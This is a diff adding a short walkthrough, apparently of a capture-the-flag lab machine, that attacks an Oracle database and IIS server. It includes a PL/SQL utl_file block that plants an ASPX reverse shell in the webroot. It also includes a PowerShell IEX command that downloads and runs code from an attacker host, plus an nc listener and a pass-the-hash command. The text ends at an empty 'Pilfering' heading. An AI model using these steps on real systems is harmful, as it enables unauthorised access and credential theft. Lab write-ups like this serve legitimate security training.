@@ -1,0 +1,35 @@
+Step 1 (Scanning)
+- Target was scanned and rescanned using Nmap
+
+Step 2 (Enumeration)
+- target has oracle running on port 1521 and port 80 open
+- odat.py 'https://github.com/quentinhardy/odat' was run to get the database SID and user/password
+- ASPX file was edited to remove styling and unnecessary line breaks/ chars
+- login to database using sqlplus64 using:
+- sqlplus64 <user/pass>@<ip>:<port>/<SID> as sysdba
+  
+Step 3 (Gaining access)
+- upload aspx reverse shell through oracle by using:
+- declare
+-   f utl_file.file_type;
+-   s varchar(5000) := '<reverseshell script>';
+- begin
+-   f := utl_file.fopen('/inetpub/wwwroot', 'filename.aspx', 'W');
+-   utl_file.put_line(f,s);
+-   utl_file.fclose(f);
+- end;
+- access file by using extention 'filename.aspx' on URL bar
+
+Step 4 (Lateral movement)
+- on browser based shell use powershell command:
+- powershell.exe IEX(New-Object Net.Webclient).downloadString('http://<attack IP>:<port>/<file>')
+- set up nc listener and wait for reverse shell
+
+Step 5 (Priviledge escalation)
+- in user profile there is a dropbox link and password for the dropbox
+- download the .dmg file from dropbox
+- decrypt file using volatility set to the target OS system specification
+- use pth-winexe to pass the hash to the system from the recovered administrator hash using
+- 'pth-winexe -U <hash> //10.10.10.82 cmd
+
+Step 6 (Pilfering)
